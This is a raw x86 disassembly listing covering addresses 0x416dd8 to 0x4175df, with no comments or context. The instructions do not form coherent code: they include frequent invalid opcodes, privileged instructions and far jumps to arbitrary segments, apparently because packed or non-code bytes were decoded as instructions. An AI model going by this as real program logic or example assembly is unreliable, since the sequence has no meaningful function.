  416dd8:	sbb    dh,BYTE PTR [ebx+0x19926e40]
  416dde:	ins    DWORD PTR es:[edi],dx
  416ddf:	(bad)  
  416de0:	xor    al,0xf7
  416de2:	cmp    DWORD PTR [ecx-0x55b20e26],0xdf64a9d5
  416dec:	inc    eax
  416ded:	mov    ah,0x40
  416def:	stos   BYTE PTR es:[edi],al
  416df0:	sbb    BYTE PTR [ecx+ecx*8-0x28],0x1e
  416df5:	xchg   DWORD PTR [ebx],esp
  416df7:	and    eax,0x6af7395d
  416dfc:	shl    DWORD PTR [ebx],cl
  416dfe:	cmp    DWORD PTR [eax+eiz*2+0x48513651],esp
  416e05:	mov    al,ds:0x10201765
  416e0a:	or     al,0x8d
  416e0c:	pop    eax
  416e0d:	push   ebx
  416e0e:	pushf  
  416e0f:	push   ebp
  416e10:	push   ds
  416e11:	jle    0x416dfd
  416e13:	dec    esi
  416e14:	jl     0x416e93
  416e16:	or     esp,ebx
  416e18:	int    0x7d
  416e1a:	out    0xa5,al
  416e1c:	xchg   edi,eax
  416e1d:	fild   QWORD PTR [eax]
  416e1f:	cdq    
  416e20:	and    al,0x92
  416e22:	or     ah,BYTE PTR [esi-0x19dd44d9]
  416e28:	fcmovb st,st(5)
  416e2a:	add    DWORD PTR [ebp+0x254c80f9],0x4b
  416e31:	mov    ch,0x86
  416e33:	pop    ds
  416e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e35:	and    ebp,DWORD PTR [ecx-0xcff83c9]
  416e3b:	gs pop edx
  416e3d:	jae    0x416e43
  416e3f:	inc    edx
  416e40:	fbld   TBYTE PTR [edx+0x28]
  416e43:	jp     0x416e94
  416e45:	arpl   WORD PTR [ecx-0x35],cx
  416e48:	lods   al,BYTE PTR ds:[esi]
  416e49:	add    DWORD PTR [eax],edi
  416e4b:	aaa    
  416e4c:	dec    esp
  416e4d:	inc    eax
  416e4e:	fwait
  416e4f:	daa    
  416e50:	aaa    
  416e51:	mov    ds:0xfd33aa35,al
  416e56:	ins    DWORD PTR es:[edi],dx
  416e57:	or     esi,ebx
  416e59:	push   edi
  416e5a:	jge    0x416e4c
  416e5c:	mov    edi,DWORD PTR [ebx+edi*4-0x6d]
  416e60:	das    
  416e61:	sub    al,0xec
  416e63:	test   BYTE PTR [eax-0x52097476],dl
  416e69:	call   0x51bb:0x564ebb13
  416e70:	dec    ebp
  416e71:	xchg   ecx,eax
  416e72:	jnp    0x416edb
  416e74:	and    ecx,edi
  416e76:	xor    eax,0x71261106
  416e7b:	pop    ds
  416e7c:	lds    edx,FWORD PTR ds:0xd11f2965
  416e82:	bound  ebp,QWORD PTR [ebp+0x4ecd55b1]
  416e88:	loop   0x416ee7
  416e8a:	adc    al,0xc
  416e8c:	sub    DWORD PTR [edx+ebp*1],0x1c
  416e90:	and    eax,0xb0973bfc
  416e95:	mov    WORD PTR ds:0x7e39db9,ss
  416e9b:	pop    ebp
  416e9c:	cmp    BYTE PTR cs:[ecx+0x7644f3a5],ch
  416ea3:	aas    
  416ea4:	adc    DWORD PTR [eax+0x2c],ebp
  416ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ea8:	and    eax,DWORD PTR [ecx+0x2]
  416eab:	sahf   
  416eac:	fistp  QWORD PTR [ebx+0x4365666e]
  416eb2:	(bad)  
  416eb3:	add    ah,BYTE PTR [eax-0x67653993]
  416eb9:	inc    edi
  416eba:	cs xchg esi,eax
  416ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ebd:	dec    esi
  416ebe:	out    dx,eax
  416ebf:	jno    0x416e41
  416ec1:	jae    0x416f1e
  416ec3:	and    dh,BYTE PTR [esi+0x374cf867]
  416ec9:	adc    cl,BYTE PTR fs:[eax+eax*1-0x3ef741]
  416ed1:	push   es
  416ed2:	ins    DWORD PTR es:[edi],dx
  416ed3:	adc    esi,DWORD PTR [ebp-0x60]
  416ed6:	test   DWORD PTR [ebp+0x76],0x6659c1e
  416edd:	cld    
  416ede:	xor    eax,0xdb5a1fb9
  416ee3:	inc    esi
  416ee4:	(bad)  
  416ee5:	xor    ebx,ebp
  416ee7:	call   0x2c74:0x5f4dce80
  416eee:	sbb    DWORD PTR ds:0x5389087c,eax
  416ef4:	dec    edi
  416ef5:	cmp    BYTE PTR [esi-0xcc95db9],0x48
  416efc:	mov    BYTE PTR [esi+0xb],al
  416eff:	mov    esp,0xb12ddf28
  416f04:	push   ds
  416f05:	push   edi
  416f06:	push   esp
  416f07:	ror    DWORD PTR [esi+ebp*4+0x2dae703f],0x7d
  416f0f:	and    eax,0xcc3dde5c
  416f14:	sub    al,0xf3
  416f16:	scas   eax,DWORD PTR es:[edi]
  416f17:	movd   mm0,edx
  416f1a:	pop    ss
  416f1b:	mov    ds:0xcd2d5aa2,eax
  416f20:	inc    ebx
  416f21:	and    eax,0xf48a06ea
  416f26:	clc    
  416f27:	xor    eax,0x1e2acf98
  416f2c:	xor    dl,BYTE PTR [ebp+ecx*4-0x2d]
  416f30:	dec    edx
  416f31:	mov    bl,0x6d
  416f33:	pusha  
  416f34:	cmp    DWORD PTR [ebp+0x45],0xc0effca3
  416f3b:	inc    edx
  416f3d:	stc    
  416f3e:	or     DWORD PTR [ebx],esi
  416f40:	gs mov ecx,0x7499d477
  416f46:	pusha  
  416f47:	icebp  
  416f48:	mov    ecx,0x4142412a
  416f4d:	xor    eax,DWORD PTR [edx+0x180e1422]
  416f53:	add    edi,DWORD PTR [eax-0x39]
  416f56:	int3   
  416f57:	push   es
  416f58:	xchg   esi,edx
  416f5a:	cli    
  416f5b:	and    esp,esi
  416f5d:	sar    DWORD PTR [eax+0x3052e895],0x29
  416f64:	and    ah,dh
  416f66:	pop    edi
  416f67:	dec    edi
  416f68:	fdiv   QWORD PTR [edx-0x5c37588]
  416f6e:	sub    al,0x22
  416f70:	mov    ah,0x2
  416f72:	in     eax,dx
  416f73:	repz dec esp
  416f75:	outs   dx,BYTE PTR ds:[esi]
  416f76:	mov    cl,0xc6
  416f78:	add    edi,DWORD PTR [ecx-0x2226fdfc]
  416f7e:	mov    ds:0x5d10ed09,al
  416f83:	outs   dx,BYTE PTR ds:[esi]
  416f84:	addr16 cwde 
  416f86:	jae    0x416ff9
  416f88:	dec    ecx
  416f89:	jmp    0x53a2:0x1e8cc67e
  416f90:	sbb    BYTE PTR [eax],bl
  416f92:	leave  
  416f93:	hlt    
  416f94:	hlt    
  416f95:	out    0x3b,al
  416f97:	inc    esi
  416f98:	jne    0x417012
  416f9a:	sbb    al,0x4f
  416f9c:	rcr    BYTE PTR fs:[esi],0x4d
  416fa0:	dec    eax
  416fa1:	xchg   esp,edx
  416fa3:	dec    ebp
  416fa4:	adc    DWORD PTR [ebp-0xd],edx
  416fa7:	push   esi
  416fa8:	push   es
  416fa9:	imul   esi,ebp,0x83f3be3c
  416faf:	pop    eax
  416fb0:	or     BYTE PTR [ecx+0x1dc159aa],cl
  416fb6:	or     eax,0xe41c983f
  416fbb:	loop   0x416fe4
  416fbd:	cmp    eax,0x12a29b2e
  416fc2:	inc    edi
  416fc3:	jle    0x417014
  416fc5:	int3   
  416fc6:	xor    eax,0x30a888d8
  416fcb:	aaa    
  416fcc:	dec    edi
  416fcd:	push   eax
  416fce:	sub    edx,DWORD PTR [edi+eiz*4-0xe]
  416fd2:	scas   eax,DWORD PTR es:[edi]
  416fd3:	xor    bh,BYTE PTR ds:0x4bfab30e
  416fd9:	sahf   
  416fda:	pop    esp
  416fdb:	scas   eax,DWORD PTR es:[edi]
  416fdc:	out    0x34,al
  416fde:	sub    al,0xb0
  416fe0:	shr    DWORD PTR [eax],1
  416fe2:	mov    edi,0x4396367a
  416fe7:	into   
  416fe8:	imul   edi,ecx,0xbd22889e
  416fee:	push   esi
  416fef:	(bad)  
  416ff0:	xchg   ecx,eax
  416ff1:	push   es
  416ff2:	sub    DWORD PTR [ebp+0x44],edx
  416ff5:	fisubr DWORD PTR [edx+0x3a]
  416ff8:	gs sub al,0xa2
  416ffb:	dec    eax
  416ffc:	popa   
  416ffd:	jg     0x416fac
  416fff:	test   BYTE PTR ds:[ecx],bh
  417002:	sbb    BYTE PTR [esi+esi*4+0x62],dh
  417006:	dec    al
  417008:	mov    bl,0x8
  41700a:	and    eax,eax
  41700c:	xor    esp,ecx
  41700e:	mov    bh,0xb5
  417010:	push   0x10
  417012:	jg     0x41701a
  417014:	sub    cl,BYTE PTR [ebp-0x5d9c1cd2]
  41701a:	dec    ebp
  41701b:	mov    cl,0x77
  41701d:	push   edx
  41701e:	and    ebp,0x3c65e038
  417024:	(bad)  
  417025:	dec    DWORD PTR [ecx-0x127f81a6]
  41702b:	sti    
  41702c:	cwde   
  41702d:	aaa    
  41702e:	dec    ebp
  41702f:	mov    BYTE PTR [eax+ecx*8],ah
  417032:	lods   eax,DWORD PTR ds:[esi]
  417033:	xor    eax,DWORD PTR [edi-0xbff29cc]
  417039:	push   eax
  41703a:	retf   
  41703b:	arpl   di,bx
  41703d:	ja     0x417027
  41703f:	jecxz  0x41707a
  417041:	sbb    BYTE PTR [edi],0xcd
  417044:	stos   BYTE PTR es:[edi],al
  417045:	mov    al,0xee
  417047:	mov    ah,0x4c
  417049:	cdq    
  41704a:	enter  0x869e,0x61
  41704e:	idiv   DWORD PTR [esi-0x2d]
  417051:	mov    bl,cl
  417053:	push   edi
  417054:	daa    
  417055:	jmp    0x417016
  417057:	icebp  
  417058:	imul   eax,DWORD PTR [eax+0x1d],0xfcaf8668
  41705f:	and    bh,cl
  417061:	call   0x8401:0x2eee3e1a
  417068:	adc    DWORD PTR [ebp+edi*1+0x2b],edi
  41706c:	xlat   BYTE PTR ds:[ebx]
  41706d:	stos   DWORD PTR es:[edi],eax
  41706e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41706f:	jmp    0xe19c:0xf9c8d38a
  417076:	xchg   esp,eax
  417077:	add    BYTE PTR [eax-0xa],al
  41707a:	pop    es
  41707b:	adc    ecx,DWORD PTR [esi-0x51a710f5]
  417081:	xchg   edx,esi
  417083:	dec    eax
  417084:	mov    al,fs:0x9836efb3
  41708a:	or     BYTE PTR [edi-0x1e],0x96
  41708e:	mov    edx,DWORD PTR [eax]
  417090:	dec    ebp
  417091:	push   ss
  417092:	mov    al,0xe4
  417094:	sbb    ah,cl
  417096:	mov    ah,0xac
  417098:	jmp    0x41705b
  41709a:	pop    edx
  41709b:	mov    edx,0x91b43fe7
  4170a0:	mov    ecx,0x3215f3af
  4170a5:	push   eax
  4170a6:	popf   
  4170a7:	push   cs
  4170a8:	and    eax,0xfbe9f0bb
  4170ad:	sbb    DWORD PTR [ecx+0x35af3337],0x2fa8780c
  4170b7:	mov    edx,0x583f2e38
  4170bc:	cld    
  4170bd:	inc    eax
  4170be:	iret   
  4170bf:	fadd   DWORD PTR [edi+0x623d6c18]
  4170c5:	lea    ebx,[ebx+0x39]
  4170c8:	aaa    
  4170c9:	push   esi
  4170ca:	stos   BYTE PTR es:[edi],al
  4170cb:	mov    dh,0xa8
  4170cd:	out    0xed,al
  4170cf:	mov    BYTE PTR [ebx+0x6c],0x75
  4170d3:	add    esi,DWORD PTR ds:0x7c09ec3
  4170d9:	leave  
  4170da:	cmp    esp,ebp
  4170dc:	sbb    ecx,DWORD PTR gs:[ebx-0x76f619b]
  4170e3:	jl     0x4170c5
  4170e5:	sbb    cl,BYTE PTR [ecx-0x5f]
  4170e8:	inc    DWORD PTR [ecx+0x1c]
  4170eb:	popa   
  4170ec:	adc    ebp,DWORD PTR [edx]
  4170ee:	xchg   ecx,eax
  4170ef:	and    BYTE PTR [edi],0x8d
  4170f2:	sbb    BYTE PTR [esi],al
  4170f4:	mov    cl,BYTE PTR [edx]
  4170f6:	xchg   edx,eax
  4170f7:	add    al,0xb4
  4170f9:	les    edi,FWORD PTR [edi]
  4170fb:	es int3 
  4170fd:	and    ebp,ebp
  4170ff:	ins    BYTE PTR es:[edi],dx
  417100:	xchg   ebx,eax
  417101:	xchg   esi,eax
  417102:	mov    edx,?
  417104:	dec    ebx
  417105:	fstp   QWORD PTR [ebx+0x27]
  417108:	fdivr  st,st(5)
  41710a:	repz adc ax,WORD PTR ds:0x4246d829
  417112:	inc    esi
  417113:	mov    bh,0x7
  417115:	int3   
  417116:	das    
  417117:	mov    ecx,DWORD PTR [eax+0x4c92f462]
  41711d:	shl    BYTE PTR [eax-0x36],0xc8
  417121:	cwde   
  417122:	into   
  417123:	in     al,0xc0
  417125:	jnp    0x4170d3
  417127:	adc    ebp,DWORD PTR [ebp-0x3b]
  41712a:	mov    edi,0xbc873b45
  41712f:	fistp  WORD PTR [eax+0x2d6e5d3c]
  417135:	popa   
  417136:	ins    DWORD PTR es:[edi],dx
  417137:	inc    esp
  417138:	int3   
  417139:	out    0x8c,al
  41713b:	mov    dh,0x9
  41713d:	or     BYTE PTR ds:0x2bcde448,bh
  417143:	xchg   ebx,eax
  417144:	jecxz  0x4171ae
  417146:	(bad)  
  417147:	aad    0x4a
  417149:	jnp    0x417127
  41714b:	sub    cl,BYTE PTR [esi+ecx*8+0x107458b5]
  417152:	jns    0x417114
  417154:	ja     0x417143
  417156:	push   esp
  417157:	jmp    0x648:0x18f278a8
  41715e:	mov    eax,0x98cc0e53
  417163:	mov    edi,0x4bf03c79
  417168:	jns    0x4170f5
  41716a:	inc    di
  41716c:	inc    ebx
  41716d:	pop    eax
  41716e:	xchg   DWORD PTR ds:0xfa448458,eax
  417174:	pop    ecx
  417175:	dec    esp
  417176:	and    al,0xc3
  417178:	rol    cl,0x8c
  41717b:	jl     0x417181
  41717d:	idiv   BYTE PTR [ebp-0x4f]
  417180:	inc    eax
  417181:	cmp    ch,BYTE PTR [esi-0x71]
  417184:	xchg   esp,eax
  417185:	lea    esp,[ebx-0x21]
  417188:	dec    ebx
  417189:	cmp    ebx,esp
  41718b:	aas    
  41718c:	and    ch,bl
  41718e:	add    eax,0xf97649b3
  417193:	xchg   BYTE PTR [edx],ch
  417195:	daa    
  417196:	repnz (bad) 
  417198:	(bad)  
  417199:	xchg   ebp,eax
  41719a:	xchg   DWORD PTR [edx+0x79],ecx
  41719d:	ss push es
  41719f:	je     0x417160
  4171a1:	hlt    
  4171a2:	les    eax,FWORD PTR [edi]
  4171a4:	or     eax,0x4abfc3f0
  4171a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171aa:	mov    esi,0x47419466
  4171af:	xlat   BYTE PTR ds:[ebx]
  4171b0:	(bad)  
  4171b2:	cs mov ebp,0x269abc24
  4171b8:	sub    eax,0xcba22e0a
  4171bd:	inc    edi
  4171be:	loopne 0x4171e2
  4171c0:	fsqrt  
  4171c2:	adc    dh,ch
  4171c4:	fwait
  4171c5:	pop    ebp
  4171c6:	out    dx,eax
  4171c7:	xchg   esi,eax
  4171c8:	xchg   esi,eax
  4171c9:	fst    QWORD PTR [eax+ebp*1-0x4bb6771]
  4171d0:	retf   0x793b
  4171d3:	mov    edi,cs
  4171d5:	inc    esp
  4171d6:	and    BYTE PTR [edx-0x1666a250],0x16
  4171dd:	out    dx,al
  4171de:	xor    BYTE PTR [esi-0x54],dh
  4171e1:	repz aam 0x90
  4171e4:	and    BYTE PTR [edi+esi*8-0x725c90e],0x2d
  4171ec:	call   FWORD PTR ds:0x705f1ea7
  4171f2:	jmp    0x2cf7:0x72aaac8
  4171f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171fa:	stc    
  4171fb:	mov    WORD PTR [eax-0x6d],fs
  4171fe:	ficom  DWORD PTR [ecx+esi*8-0x6b]
  417202:	sub    eax,0xa9c86a45
  417207:	jmp    0x4171f7
  417209:	jmp    0x417192
  41720b:	es mov ah,0xb0
  41720e:	push   eax
  41720f:	out    0xf2,al
  417211:	pop    ebx
  417212:	scas   eax,DWORD PTR es:[edi]
  417213:	in     eax,0xd2
  417215:	in     eax,0xdd
  417217:	fwait
  417218:	adc    ecx,edi
  41721a:	mov    esp,0xadb6f4bf
  41721f:	fwait
  417220:	pushf  
  417221:	xor    ch,BYTE PTR [edx+ebx*2-0x69201a08]
  417228:	dec    eax
  417229:	adc    ebx,DWORD PTR [ecx+0x6bf7cfb6]
  41722f:	mov    ss,WORD PTR [ecx+0x4b]
  417232:	mov    esi,ebx
  417234:	dec    eax
  417235:	push   ss
  417236:	es jmp 0xe7e7:0x335d7f38
  41723e:	xchg   BYTE PTR [ebp-0x4ef54440],ah
  417244:	test   BYTE PTR [ebx-0x6b7bc158],bl
  41724a:	fisub  DWORD PTR [ebx+0x49e40bce]
  417250:	mov    ebx,?
  417252:	ret    0xd42f
  417255:	aad    0xf6
  417257:	jbe    0x417292
  417259:	inc    ebp
  41725a:	and    ch,dh
  41725c:	int    0x15
  41725e:	jne    0x4172d7
  417260:	mov    esp,DWORD PTR [ebp+0x15]
  417263:	mov    ds:0xb725062d,al
  417268:	add    BYTE PTR [eax+ecx*8-0x30],bl
  41726c:	mov    esi,0x803f5d76
  417271:	in     al,0xeb
  417273:	in     al,dx
  417274:	add    ah,BYTE PTR ds:0x2989fbb7
  41727a:	nop
  41727b:	xor    DWORD PTR [edi-0x78087a07],0x5
  417282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417283:	push   eax
  417284:	and    bh,BYTE PTR [esi-0x11961b32]
  41728a:	ss aad 0x76
  41728d:	ret    0xbfc
  417290:	jnp    0x417233
  417292:	into   
  417293:	sub    BYTE PTR [edx+edx*4-0x3b],bl
  417297:	cmp    esp,0xb1885525
  41729d:	test   DWORD PTR [ebp+0x4f87e1a],ecx
  4172a3:	mov    DWORD PTR [edi+0x62],eax
  4172a6:	xchg   ebp,eax
  4172a7:	lahf   
  4172a8:	lods   al,BYTE PTR ds:[esi]
  4172a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172aa:	and    ah,bl
  4172ac:	or     eax,DWORD PTR [ebx]
  4172ae:	adc    eax,0x92c5d3cb
  4172b3:	mov    es,WORD PTR [edi-0x4d5371e3]
  4172b9:	mov    ch,0x2d
  4172bb:	mov    bl,0x7f
  4172bd:	enter  0x9d83,0x89
  4172c1:	test   BYTE PTR [ebx+edx*2+0x7c],ch
  4172c5:	rcl    BYTE PTR [ebx+ebp*8+0x15de7b2d],0x19
  4172cd:	pop    ebp
  4172ce:	xchg   DWORD PTR [eax+edx*2-0x258789c],edx
  4172d5:	add    DWORD PTR [ecx+eax*8],0x725f173c
  4172dc:	daa    
  4172dd:	and    eax,0xeedbc388
  4172e2:	sub    dh,ah
  4172e4:	ja     0x417323
  4172e6:	(bad)  
  4172e7:	fwait
  4172e8:	add    eax,0xe1bfbef4
  4172ed:	mov    ecx,edi
  4172ef:	cdq    
  4172f0:	mov    esp,0x66b84deb
  4172f5:	in     al,0x93
  4172f7:	mov    BYTE PTR [edi+0x1c],dh
  4172fa:	outs   dx,DWORD PTR ds:[esi]
  4172fb:	push   edi
  4172fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172fd:	aam    0x98
  4172ff:	fstp   st(7)
  417301:	mov    dh,0xb4
  417303:	cmp    DWORD PTR [edx-0x7f526647],ebp
  417309:	sbb    esi,DWORD PTR [ebx+0x5c588439]
  41730f:	dec    ebx
  417310:	mov    ebx,0x6dcfc8cb
  417315:	mov    esp,0x1fad15af
  41731a:	push   cs
  41731b:	loope  0x41734f
  41731d:	inc    ebx
  41731e:	sub    ah,dh
  417320:	and    DWORD PTR [ecx-0x5f],0xd3306c97
  417327:	or     DWORD PTR [ebp-0x5164147],esi
  41732d:	adc    ecx,ebx
  41732f:	mov    ebx,0xca9336bf
  417334:	cmp    ch,BYTE PTR [esp+ebp*2-0x9803450]
  41733b:	test   dh,dl
  41733d:	scas   al,BYTE PTR es:[edi]
  41733e:	shl    BYTE PTR [esi-0x4c],cl
  417341:	mov    bh,0xa7
  417343:	adc    eax,0x9ff0085e
  417348:	jnp    0x417359
  41734a:	aas    
  41734b:	ds nop
  41734d:	cmp    eax,0x945e13dc
  417352:	sub    al,BYTE PTR [ebp-0x23042b6b]
  417358:	addr16 sub esp,ebx
  41735b:	inc    ecx
  41735c:	pop    DWORD PTR [ecx+0x4ffc84f2]
  417362:	and    DWORD PTR [bp+si],0x258fb2cf
  417369:	bound  ebx,QWORD PTR [ecx-0x68]
  41736c:	aas    
  41736d:	fs jecxz 0x4173bb
  417370:	xchg   esi,eax
  417371:	neg    cl
  417373:	and    ebp,ebx
  417375:	inc    esp
  417376:	imul   edi,DWORD PTR [ebx+0x6c],0x4744657
  41737d:	mov    bl,0x2
  41737f:	int    0xa8
  417381:	(bad)  
  417382:	hlt    
  417383:	lods   eax,DWORD PTR ds:[esi]
  417384:	aad    0x29
  417386:	inc    esp
  417387:	pop    esp
  417388:	or     al,0xcc
  41738a:	jl     0x417386
  41738c:	push   0x3e
  41738e:	gs push 0x5c3d4a3b
  417394:	clc    
  417395:	or     al,0xde
  417397:	ss mov cl,0xe8
  41739a:	ror    DWORD PTR [eax-0x5eca4a77],cl
  4173a0:	push   DWORD PTR [edi]
  4173a2:	scas   al,BYTE PTR es:[edi]
  4173a3:	pop    ss
  4173a4:	dec    DWORD PTR [eax-0x7249978b]
  4173aa:	jb     0x4173c8
  4173ac:	and    esp,DWORD PTR [esp+ebx*8]
  4173af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b0:	push   cs
  4173b1:	sub    edx,DWORD PTR [edx+0x6cbdf76d]
  4173b7:	xchg   BYTE PTR [ecx+0x35955662],ch
  4173bd:	xchg   DWORD PTR [esi+ebx*2],ebp
  4173c0:	adc    al,0x90
  4173c2:	inc    esp
  4173c4:	fistp  DWORD PTR [edx]
  4173c6:	jae    0x4173e2
  4173c8:	scas   al,BYTE PTR es:[edi]
  4173c9:	iret   
  4173ca:	or     BYTE PTR [esi+0x2aa04ee5],0x9d
  4173d1:	xor    eax,0x9b463730
  4173d6:	dec    eax
  4173d7:	add    DWORD PTR [esi+edx*1],ebx
  4173da:	mov    esi,edx
  4173dc:	xchg   esi,eax
  4173dd:	daa    
  4173de:	cli    
  4173df:	imul   esp,DWORD PTR [ecx-0x4],0xffffffe7
  4173e3:	and    DWORD PTR [esi+edx*8],esp
  4173e6:	std    
  4173e7:	and    eax,ebx
  4173e9:	outs   dx,BYTE PTR ds:[esi]
  4173ea:	push   esp
  4173eb:	retf   
  4173ec:	clc    
  4173ed:	repz enter 0x486a,0x7d
  4173f2:	mov    edx,0xdfbdeb7f
  4173f7:	mov    bl,0xa6
  4173f9:	int    0x61
  4173fb:	pop    ds
  4173fc:	push   0x98e78bf6
  417401:	add    DWORD PTR [ebx-0x3e],esp
  417404:	add    edx,esi
  417406:	(bad)
  417409:	lds    edx,FWORD PTR [esi-0x21]
  41740c:	xor    bl,BYTE PTR [ebx-0x79d61be1]
  417412:	ret    
  417413:	sbb    BYTE PTR [ebx+edx*8+0x6a8ff69b],bl
  41741a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41741c:	xor    esp,DWORD PTR [ebx-0x50]
  41741f:	xchg   DWORD PTR ds:0xbf5632be,ecx
  417425:	repz stc 
  417427:	sbb    ch,BYTE PTR [ebx-0x51]
  41742a:	sbb    al,0x80
  41742c:	dec    ebx
  41742d:	sub    DWORD PTR [edi-0x7e],edi
  417430:	lea    esi,[edi+0x7c]
  417433:	out    dx,eax
  417434:	jmp    0x417478
  417436:	test   eax,0xef26f6c2
  41743b:	icebp  
  41743c:	outs   dx,BYTE PTR ds:[esi]
  41743d:	mov    ebx,0xde773b67
  417442:	nop
  417443:	jae    0x41749c
  417445:	adc    ebp,DWORD PTR fs:[eax]
  417448:	and    ch,BYTE PTR [ebp-0x14]
  41744b:	push   ecx
  41744c:	arpl   sp,bx
  41744e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744f:	imul   edi,DWORD PTR [esi+0x47],0x1f
  417453:	mul    BYTE PTR [esi+ebp*8]
  417456:	xchg   ebx,eax
  417457:	aaa    
  417458:	cmp    ah,BYTE PTR [edx+0x55]
  41745b:	cld    
  41745c:	dec    edi
  41745d:	dec    eax
  41745e:	arpl   WORD PTR [edx+0x5efc0acf],ax
  417464:	xchg   BYTE PTR [ecx+0x70fe3eb1],ah
  41746a:	jge    0x41742e
  41746c:	add    BYTE PTR [eax+esi*1],0x40
  417470:	xor    al,0x7b
  417472:	pop    edx
  417473:	into   
  417474:	popf   
  417475:	mov    cx,WORD PTR [edx+esi*1-0x14d80f85]
  41747d:	or     al,0xe1
  41747f:	dec    eax
  417480:	je     0x41744f
  417482:	shl    DWORD PTR [ecx],1
  417484:	cmp    ebp,DWORD PTR [eax+0x4d576d96]
  41748a:	add    al,0x46
  41748c:	mov    eax,ds:0x89fd2f38
  417491:	adc    al,0xd
  417493:	in     eax,dx
  417494:	fld    TBYTE PTR [ecx-0x5c17ce78]
  41749a:	loopne 0x417470
  41749c:	loope  0x417454
  41749e:	ffreep st(6)
  4174a0:	popf   
  4174a1:	jp     0x41749d
  4174a3:	(bad)  
  4174a4:	mov    ah,0xfb
  4174a6:	daa    
  4174a7:	scas   eax,DWORD PTR es:[edi]
  4174a8:	nop
  4174a9:	xor    al,0x1d
  4174ab:	mov    al,0xd7
  4174ad:	scas   al,BYTE PTR es:[edi]
  4174ae:	jp     0x417465
  4174b0:	xchg   edx,eax
  4174b1:	aaa    
  4174b2:	cdq    
  4174b3:	mov    esp,0x98f7d14a
  4174b8:	mov    edx,DWORD PTR [edi+eax*8]
  4174bb:	sti    
  4174bc:	int3   
  4174bd:	imul   ebx,DWORD PTR [edx+0x5051567],0x7ca59888
  4174c7:	mov    ecx,0x1f915622
  4174cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174cd:	nop
  4174ce:	popf   
  4174cf:	xlat   BYTE PTR ds:[ebx]
  4174d0:	outs   dx,BYTE PTR ds:[esi]
  4174d1:	xor    BYTE PTR [edi+0x26cd2e7a],bl
  4174d7:	rcl    DWORD PTR [ebp-0x74566770],cl
  4174dd:	cli    
  4174de:	sti    
  4174df:	push   es
  4174e0:	jns    0x417501
  4174e2:	or     BYTE PTR [edi],bl
  4174e4:	je     0x4174d4
  4174e6:	sub    eax,0xe1b2f483
  4174eb:	sbb    dh,BYTE PTR ds:0x22537650
  4174f1:	jl     0x417486
  4174f3:	xchg   ecx,eax
  4174f4:	add    BYTE PTR [eax-0x2103bba0],dh
  4174fa:	xchg   ebx,eax
  4174fb:	and    BYTE PTR ds:0xaef514bd,dl
  417501:	int    0x8a
  417503:	dec    edi
  417504:	jmp    0xb6eca28a
  417509:	loope  0x4174d5
  41750b:	call   0x92f6:0x8b7f3a22
  417512:	mov    dh,0xd1
  417514:	add    eax,0xaaf13275
  417519:	or     bl,BYTE PTR [ebx+0x276bdad6]
  41751f:	push   esi
  417520:	loope  0x41755b
  417522:	xchg   edx,eax
  417523:	(bad)  
  417524:	in     al,0x64
  417526:	dec    ebx
  417527:	dec    eax
  417528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417529:	ins    BYTE PTR es:[edi],dx
  41752a:	cmp    dl,dh
  41752c:	scas   al,BYTE PTR es:[edi]
  41752d:	retf   
  41752e:	cmp    al,0xdf
  417530:	out    0xbe,al
  417532:	stos   BYTE PTR es:[edi],al
  417533:	ret    
  417534:	xor    al,0x18
  417536:	cmp    eax,0xe1bf6bcd
  41753b:	mov    ebp,DWORD PTR [ebp-0x50]
  41753e:	lahf   
  41753f:	dec    DWORD PTR [ecx+0x2a888258]
  417545:	sub    BYTE PTR [esi+0x3b],ch
  417548:	mov    ds:0x14845fa4,eax
  41754d:	in     al,0xf3
  41754f:	stc    
  417550:	into   
  417551:	neg    ah
  417553:	inc    ebx
  417554:	and    eax,0xd38dde95
  417559:	hlt    
  41755a:	sub    esi,DWORD PTR [eax]
  41755c:	sub    edx,esp
  41755e:	ja     0x417598
  417560:	fadd   DWORD PTR [esi-0xf6c6580]
  417566:	test   cl,0xfb
  417569:	mov    dh,0x59
  41756b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41756c:	hlt    
  41756d:	cmc    
  41756e:	sbb    edx,DWORD PTR [ebp-0x4b]
  417571:	mov    ah,0xe7
  417573:	pop    ss
  417574:	xchg   bl,bl
  417576:	push   ds
  417577:	pop    ebx
  417578:	push   edx
  417579:	repz mov dh,0xc8
  41757c:	test   eax,0xa10654fd
  417581:	shl    bh,0xb4
  417584:	lock or DWORD PTR [edx],esi
  417587:	test   al,0xac
  41758a:	or     ah,al
  41758c:	mov    esp,0xed4ccb25
  417591:	sub    DWORD PTR [edx],edi
  417593:	xor    eax,0x35eaaf05
  417598:	adc    al,0xd1
  41759a:	adc    BYTE PTR [ebx],0x27
  41759d:	mov    bl,0xa3
  41759f:	mov    bl,BYTE PTR [bx+di-0x1966]
  4175a4:	jb     0x41754b
  4175a6:	push   ebx
  4175a7:	test   al,0x8e
  4175a9:	or     esp,ecx
  4175ab:	jp     0x417578
  4175ad:	jno    0x41760b
  4175af:	in     eax,0x11
  4175b1:	es (bad) 
  4175b3:	jnp    0x417550
  4175b5:	jp     0x417561
  4175b7:	mov    WORD PTR [ecx-0x3e],?
  4175ba:	mov    ds:0x672b93e8,al
  4175bf:	stc    
  4175c0:	not    BYTE PTR [edx+0x7f]
  4175c3:	xchg   DWORD PTR [ecx+0x17],edx
  4175c6:	sub    eax,DWORD PTR [edi+0x2f931c58]
  4175cc:	ja     0x4175b1
  4175ce:	shufps xmm1,XMMWORD PTR [eax-0x6d60d281],0x2d
  4175d6:	js     0x41757f
  4175d8:	pop    es
  4175d9:	ror    BYTE PTR [eax-0x21],1
  4175dc:	leave  
  4175dd:	aam    0x85
  4175df:	nop
